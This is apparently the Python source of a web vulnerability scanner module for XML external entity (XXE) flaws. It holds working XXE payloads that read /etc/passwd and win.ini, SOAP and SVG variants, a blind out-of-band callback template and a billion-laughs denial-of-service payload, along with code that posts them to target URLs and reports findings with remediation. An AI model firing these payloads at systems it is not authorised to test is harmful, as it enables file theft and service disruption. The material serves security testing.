"""
VORTEX XXE (XML External Entity) Scanner - V19.0
Detects XML external entity injection vulnerabilities

DETECTION METHODS:
1. Classic XXE (external entity file read)
2. Blind XXE (out-of-band data exfiltration)
3. XXE via SOAP requests
4. XXE via SVG uploads
5. DTD entity expansion (billion laughs)

AUTHORITY COMPLIANCE:
- Produces HEURISTIC_ONLY detections
- Requires AI analysis and system verification
- Final determination by authority enforcer
"""

import logging
import re
import uuid
from typing import List, Dict, Any, Optional
from urllib.parse import quote

from scanners.base import BaseScanner
from domain.models import AssessmentResult
from domain.enums import FindingType, FindingSeverity, VerificationStatus, ConfidenceSource
from core.network import HTTPResponse

logger = logging.getLogger(__name__)


class XXEScanner(BaseScanner):
    """
    XXE vulnerability scanner.
    
    Tests for:
    - Classic XXE (file read)
    - Blind XXE (OOB)
    - SOAP XXE
    - SVG XXE
    - DTD expansion attacks
    """
    
    # Classic XXE payloads for file reading
    CLASSIC_XXE_PAYLOADS = [
        # Unix file read
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
        
        # Windows file read
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
        
        # PHP wrapper
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>''',
    ]
    
    # Blind XXE payloads (requires external server)
    BLIND_XXE_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]>
<root><data>test</data></root>'''
    
    # DTD expansion (Billion Laughs)
    BILLION_LAUGHS = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''
    
    # SOAP XXE
    SOAP_XXE_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<test>&xxe;</test>
</soap:Body>
</soap:Envelope>'''
    
    # SVG XXE
    SVG_XXE_TEMPLATE = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="10" y="20">&xxe;</text>
</svg>'''
    
    # File read indicators
    FILE_READ_INDICATORS = [
        'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
        '[extensions]', '[fonts]', '[mci]',  # win.ini
        'root:x:0:0'  # Linux passwd format
    ]
    
    def __init__(self):
        super().__init__(FindingType.XXE)
        self.callback_server: Optional[str] = None
        
    async def scan(self, url: str, **kwargs) -> List[AssessmentResult]:
        """
        Scan URL for XXE vulnerabilities.
        
        Args:
            url: Target URL
            **kwargs: Optional parameters:
                - xml_data: XML data to test
                - content_type: Content-Type header
                - callback_server: URL for blind XXE testing
        
        Returns:
            List of XXE vulnerability findings
        """
        findings = []
        self.stats['scans_performed'] += 1
        
        xml_data = kwargs.get('xml_data')
        content_type = kwargs.get('content_type', 'application/xml')
        self.callback_server = kwargs.get('callback_server')
        
        try:
            # Test 1: Classic XXE (file read)
            classic_findings = await self._test_classic_xxe(url, content_type)
            findings.extend(classic_findings)
            
            # Test 2: SOAP XXE
            soap_findings = await self._test_soap_xxe(url)
            findings.extend(soap_findings)
            
            # Test 3: SVG XXE
            svg_findings = await self._test_svg_xxe(url)
            findings.extend(svg_findings)
            
            # Test 4: DTD expansion
            expansion_findings = await self._test_dtd_expansion(url, content_type)
            findings.extend(expansion_findings)
            
            # Test 5: Blind XXE (if callback server available)
            if self.callback_server:
                blind_findings = await self._test_blind_xxe(url, content_type)
                findings.extend(blind_findings)
            
            self.stats['findings_detected'] += len(findings)
        
        except Exception as e:
            logger.error(f"XXE scan error for {url}: {e}")
        
        return findings
    
    async def _test_classic_xxe(self, url: str, content_type: str) -> List[AssessmentResult]:
        """Test classic XXE file read attacks."""
        findings = []
        
        for payload in self.CLASSIC_XXE_PAYLOADS:
            try:
                headers = {
                    'Content-Type': content_type
                }
                
                response = await self.network_client.request(
                    'POST',
                    url,
                    data=payload.encode('utf-8'),
                    headers=headers
                )
                self.stats['requests_made'] += 1
                
                # Check for file content in response
                for indicator in self.FILE_READ_INDICATORS:
                    if indicator in response.body:
                        confidence = 0.90
                        
                        # Extract file content snippet
                        evidence_snippet = self._extract_evidence(response.body, indicator)
                        
                        finding = AssessmentResult(
                            id=uuid.uuid4(),
                            url=url,
                            finding_type=FindingType.XXE,
                            severity=FindingSeverity.CRITICAL,
                            status=VerificationStatus.DETECTED,
                            heuristic_score=confidence,
                            confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                            evidence=f"File content leaked via XXE: {evidence_snippet}",
                            vulnerable_parameter='xml_input',
                            payload=payload,
                            description="XXE vulnerability allows file system access",
                            remediation="Disable external entity processing in XML parser"
                        )
                        findings.append(finding)
                        return findings  # One positive is enough
            
            except Exception as e:
                logger.debug(f"Classic XXE test error: {e}")
                continue
        
        return findings
    
    async def _test_soap_xxe(self, url: str) -> List[AssessmentResult]:
        """Test XXE in SOAP requests."""
        findings = []
        
        # Only test if URL suggests SOAP endpoint
        if not any(indicator in url.lower() for indicator in ['soap', 'wsdl', 'service', 'api']):
            return findings
        
        try:
            headers = {
                'Content-Type': 'text/xml',
                'SOAPAction': 'test'
            }
            
            response = await self.network_client.request(
                'POST',
                url,
                data=self.SOAP_XXE_TEMPLATE.encode('utf-8'),
                headers=headers
            )
            self.stats['requests_made'] += 1
            
            # Check for file content
            for indicator in self.FILE_READ_INDICATORS:
                if indicator in response.body:
                    confidence = 0.90
                    
                    evidence_snippet = self._extract_evidence(response.body, indicator)
                    
                    finding = AssessmentResult(
                        id=uuid.uuid4(),
                        url=url,
                        finding_type=FindingType.XXE,
                        severity=FindingSeverity.CRITICAL,
                        status=VerificationStatus.DETECTED,
                        heuristic_score=confidence,
                        confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                        evidence=f"SOAP XXE file read: {evidence_snippet}",
                        vulnerable_parameter='soap_body',
                        payload=self.SOAP_XXE_TEMPLATE,
                        description="XXE vulnerability in SOAP endpoint",
                        remediation="Disable external entity processing in SOAP/XML parser"
                    )
                    findings.append(finding)
                    break
        
        except Exception as e:
            logger.debug(f"SOAP XXE test error: {e}")
        
        return findings
    
    async def _test_svg_xxe(self, url: str) -> List[AssessmentResult]:
        """Test XXE in SVG uploads."""
        findings = []
        
        # Only test if URL suggests file upload
        if not any(indicator in url.lower() for indicator in ['upload', 'file', 'avatar', 'image']):
            return findings
        
        try:
            # Test as SVG upload
            headers = {
                'Content-Type': 'image/svg+xml'
            }
            
            response = await self.network_client.request(
                'POST',
                url,
                data=self.SVG_XXE_TEMPLATE.encode('utf-8'),
                headers=headers
            )
            self.stats['requests_made'] += 1
            
            # Check for file content
            for indicator in self.FILE_READ_INDICATORS:
                if indicator in response.body:
                    confidence = 0.85
                    
                    evidence_snippet = self._extract_evidence(response.body, indicator)
                    
                    finding = AssessmentResult(
                        id=uuid.uuid4(),
                        url=url,
                        finding_type=FindingType.XXE,
                        severity=FindingSeverity.HIGH,
                        status=VerificationStatus.DETECTED,
                        heuristic_score=confidence,
                        confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                        evidence=f"SVG XXE file read: {evidence_snippet}",
                        vulnerable_parameter='svg_upload',
                        payload=self.SVG_XXE_TEMPLATE,
                        description="XXE vulnerability via SVG file upload",
                        remediation="Sanitize SVG uploads and disable external entities"
                    )
                    findings.append(finding)
                    break
        
        except Exception as e:
            logger.debug(f"SVG XXE test error: {e}")
        
        return findings
    
    async def _test_dtd_expansion(self, url: str, content_type: str) -> List[AssessmentResult]:
        """Test DTD entity expansion (Billion Laughs DoS)."""
        findings = []
        
        try:
            headers = {
                'Content-Type': content_type
            }
            
            import time
            start_time = time.time()
            
            response = await self.network_client.request(
                'POST',
                url,
                data=self.BILLION_LAUGHS.encode('utf-8'),
                headers=headers,
                timeout=5  # Short timeout to detect DoS
            )
            
            response_time = time.time() - start_time
            self.stats['requests_made'] += 1
            
            # If response is very slow or times out, might be vulnerable
            if response_time > 4.0 or response.status_code == 503:
                confidence = 0.70
                
                finding = AssessmentResult(
                    id=uuid.uuid4(),
                    url=url,
                    finding_type=FindingType.XXE,
                    severity=FindingSeverity.HIGH,
                    status=VerificationStatus.DETECTED,
                    heuristic_score=confidence,
                    confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                    evidence=f"DTD expansion caused slow response ({response_time:.2f}s) or DoS",
                    vulnerable_parameter='xml_input',
                    payload=self.BILLION_LAUGHS[:200] + '...',
                    description="XML parser vulnerable to entity expansion DoS",
                    remediation="Limit entity expansion in XML parser configuration"
                )
                findings.append(finding)
        
        except Exception as e:
            # Timeout might indicate successful DoS
            if 'timeout' in str(e).lower():
                confidence = 0.75
                
                finding = AssessmentResult(
                    id=uuid.uuid4(),
                    url=url,
                    finding_type=FindingType.XXE,
                    severity=FindingSeverity.HIGH,
                    status=VerificationStatus.DETECTED,
                    heuristic_score=confidence,
                    confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                    evidence="DTD expansion caused request timeout",
                    vulnerable_parameter='xml_input',
                    payload=self.BILLION_LAUGHS[:200] + '...',
                    description="XML parser vulnerable to entity expansion DoS",
                    remediation="Limit entity expansion in XML parser configuration"
                )
                findings.append(finding)
        
        return findings
    
    async def _test_blind_xxe(self, url: str, content_type: str) -> List[AssessmentResult]:
        """Test blind XXE with out-of-band callback."""
        findings = []
        
        if not self.callback_server:
            return findings
        
        try:
            # Create blind XXE payload with callback
            blind_payload = self.BLIND_XXE_TEMPLATE.format(
                callback_url=self.callback_server
            )
            
            headers = {
                'Content-Type': content_type
            }
            
            response = await self.network_client.request(
                'POST',
                url,
                data=blind_payload.encode('utf-8'),
                headers=headers
            )
            self.stats['requests_made'] += 1
            
            # Note: Actual callback detection would require monitoring callback_server
            # This is a heuristic check - if no error, might be vulnerable
            if response.status_code in [200, 201, 202]:
                confidence = 0.60  # Lower confidence without callback confirmation
                
                finding = AssessmentResult(
                    id=uuid.uuid4(),
                    url=url,
                    finding_type=FindingType.XXE,
                    severity=FindingSeverity.HIGH,
                    status=VerificationStatus.DETECTED,
                    heuristic_score=confidence,
                    confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                    evidence=f"Blind XXE payload accepted - check callback server {self.callback_server}",
                    vulnerable_parameter='xml_input',
                    payload=blind_payload,
                    description="Potential blind XXE vulnerability (requires callback verification)",
                    remediation="Disable external entity processing in XML parser"
                )
                findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Blind XXE test error: {e}")
        
        return findings
    
    def _extract_evidence(self, body: str, indicator: str) -> str:
        """Extract evidence snippet around indicator."""
        try:
            index = body.index(indicator)
            start = max(0, index - 50)
            end = min(len(body), index + 100)
            snippet = body[start:end]
            return snippet.replace('\n', ' ')[:150]
        except:
            return indicator
    
    def generate_payloads(self, **kwargs) -> List[str]:
        """
        Generate XXE test payloads.
        
        Returns:
            List of XXE payloads
        """
        payloads = []
        
        # Add classic payloads
        payloads.extend(self.CLASSIC_XXE_PAYLOADS)
        
        # Add SOAP payload
        payloads.append(self.SOAP_XXE_TEMPLATE)
        
        # Add SVG payload
        payloads.append(self.SVG_XXE_TEMPLATE)
        
        # Add DTD expansion
        payloads.append(self.BILLION_LAUGHS)
        
        # Add blind XXE if callback available
        if 'callback_url' in kwargs:
            payloads.append(self.BLIND_XXE_TEMPLATE.format(
                callback_url=kwargs['callback_url']
            ))
        
        return payloads
    
    def analyze_response(self, response: HTTPResponse, payload: str) -> Dict[str, Any]:
        """
        Analyze response for XXE vulnerability indicators.
        
        Args:
            response: HTTP response
            payload: Payload that was sent
        
        Returns:
            Analysis dict with detection results
        """
        detected = False
        confidence = 0.0
        evidence = ""
        
        # Check for file content indicators
        for indicator in self.FILE_READ_INDICATORS:
            if indicator in response.body:
                detected = True
                confidence = 0.90
                evidence = f"File content leaked: {indicator}"
                break
        
        # Check for XML errors
        xml_errors = ['xml', 'entity', 'dtd', 'external', 'parse error']
        body_lower = response.body.lower()
        
        if any(err in body_lower for err in xml_errors):
            if not detected:
                confidence = 0.50
                evidence = "XML processing error detected"
        
        return {
            'detected': detected,
            'confidence': confidence,
            'evidence': evidence,
            'response_analysis': {
                'status_code': response.status_code,
                'has_file_indicators': any(ind in response.body for ind in self.FILE_READ_INDICATORS),
                'has_xml_errors': any(err in body_lower for err in xml_errors)
            }
        }


# Global scanner instance
global_xxe_scanner: Optional[XXEScanner] = None


def get_xxe_scanner() -> XXEScanner:
    """Get or create global XXE scanner instance."""
    global global_xxe_scanner
    
    if global_xxe_scanner is None:
        global_xxe_scanner = XXEScanner()
    
    return global_xxe_scanner